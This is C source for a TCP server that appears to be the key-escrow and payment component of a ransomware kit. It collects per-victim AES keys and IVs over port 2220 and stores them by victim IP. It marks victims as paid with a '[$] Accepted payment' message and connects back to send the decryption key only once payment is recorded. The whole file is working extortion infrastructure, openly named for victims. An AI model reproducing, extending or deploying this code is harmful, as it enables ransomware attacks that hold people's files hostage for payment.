#include <stdio.h>
#include <sys/socket.h>
#include <errno.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

#define SIZEKEY 32
#define SIZEIV 16

// ========================== Functions signatures ==========================

char receive_data(char *pKey, char *pIv,char *buffer);
void send_key(char *pKey, char *pIv,char *targetIP);
void writeInFile(char *pKey, char *pIv,char *targetIP);
void readFile(char *pKey, char *pIv,char *targetIP);
int changePaymentStatus(char *targetIP);

// ============================== MAIN function ==============================

int main(){

	char *pKey, *pIv;
	pKey = calloc((SIZEKEY*2)+1,sizeof(unsigned char));
	pIv = calloc((SIZEIV*2)+1,sizeof(unsigned char));

	int sockid;
	int server_port = 2220;
	
	while(1){
		sockid = socket(AF_INET,SOCK_STREAM,0);

		struct sockaddr_in server_addr, client_addr;
		server_addr.sin_family = AF_INET;
		server_addr.sin_port = htons(server_port);
		server_addr.sin_addr.s_addr = htons(INADDR_ANY);

		if (setsockopt(sockid, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) < 0){
				perror("setsockopt(SO_REUSEADDR) failed");
				return -1;
		}
		char *buffer;
		buffer = calloc(1024,sizeof(char));
		int length_msg, len, client_socket;
		int bind_result = bind(sockid,(const struct sockaddr *)&server_addr,sizeof(server_addr));

		if(bind_result<0){
			printf("Error during binding\n");
			return -1;
		}
		printf("Server listening on 0.0.0.0:%d\n",server_port);
		length_msg = listen(sockid,1);

		if(length_msg<0){
			printf("Error during listen\n");
			return -1;
		}
		
		len = sizeof(client_addr);
		client_socket = accept(sockid,(struct sockaddr *)&client_addr,&len);
	
		if(client_socket<0){
			printf("Error during accept\n");
			return -1;
		}
		else{
			printf("[+] Accepted connection from %d %s:%d\n",client_socket,inet_ntoa(client_addr.sin_addr),client_addr.sin_port);
		}	
		
		length_msg = recv(client_socket,buffer,1024,MSG_WAITALL);

		char action = receive_data(pKey,pIv,buffer);
		close(sockid);

		if(action=='S'){
			printf("[>] Received from %s:%d\n",inet_ntoa(client_addr.sin_addr),client_addr.sin_port);
			printf("\t> pKEY : %s\n",pKey);
			printf("\t> pIV : %s\n",pIv);

			writeInFile(pKey,pIv,inet_ntoa(client_addr.sin_addr));
		}
		else if(action=='R'){
			send_key(pKey,pIv,inet_ntoa(client_addr.sin_addr));
		}
		else if(action=='P'){
			changePaymentStatus(inet_ntoa(client_addr.sin_addr));
		}
		free(buffer);
	}
}

// ========================== Functions implementation ==========================

char receive_data(char *pKey, char *pIv,char *buffer){

	char action;
	action = buffer[0];

	if(action=='S'){
		strncpy(pKey,buffer+1,SIZEKEY*2);
		strncpy(pIv,buffer+1+(SIZEKEY*2),SIZEIV*2);
	}
	return action;
}

void writeInFile(char *pKey, char *pIv,char *targetIP){

	char namefile[1024];
	sprintf(namefile,"database/data_%s.secret",targetIP);
	
	FILE *file = fopen(namefile,"wb");

	fwrite(pKey,SIZEKEY*2,1,file);
	fwrite(pIv,SIZEIV*2,1,file);
	printf("[+] %s successfully saved\n",namefile);
	
	fclose(file);
}

void readFile(char *pKey, char *pIv,char *targetIP){
	
	char namefile[1024];
	sprintf(namefile,"database/data_%s.secret.PAID",targetIP);
	
	FILE *file = fopen(namefile,"rb");
	if(file==NULL){
		perror("File doesn't exist\n");
	}
	else{
		fread(pKey,SIZEKEY*2,1,file);
		fread(pIv,SIZEIV*2,1,file);

		printf("[+] %s successfully read\n",namefile);
	}
	fclose(file);
}

void send_key(char *pKey, char *pIv,char *targetIP){

	int sockid = socket(AF_INET,SOCK_STREAM,0);

	struct sockaddr_in victim_addr;
	victim_addr.sin_family = AF_INET;
	victim_addr.sin_port = htons(2220);
	victim_addr.sin_addr.s_addr = inet_addr(targetIP);
	
	int success = 0;
	int rc;
	while(success<=10){
		rc = connect(sockid,(struct sockaddr *)&victim_addr,sizeof(victim_addr));
		
		if(rc==0){
			success = 11;
		}
		else{
			success++;
			sleep(2);
		}
	}
	
	readFile(pKey,pIv,targetIP);
	char *buffer = calloc(1024,sizeof(char));
	strcpy(buffer,pKey);
	strcat(buffer,pIv);

	send(sockid,(const char *)buffer,strlen(buffer),0);

	sleep(20);
	close(sockid);
}

int changePaymentStatus(char *targetIP){
	
	char ch;
	char source_file[1024], final_file[1024];
	sprintf(source_file,"database/data_%s.secret",targetIP);
	sprintf(final_file,"database/data_%s.secret.PAID",targetIP);
	FILE *source, *target;

	source = fopen(source_file, "rb");

	if (source == NULL){
		perror("File doesn't exist\n");
		return -1;
	}

	target = fopen(final_file, "wb");

	if (target == NULL){
		fclose(source);
		perror("File doesn't exist\n");
		return -1;
	}

	while ((ch = fgetc(source)) != EOF)
		fputc(ch, target);

	printf("[$] Accepted payment from %s\n",targetIP);

	fclose(source);
	fclose(target);
	remove(source_file);

	return 0;
}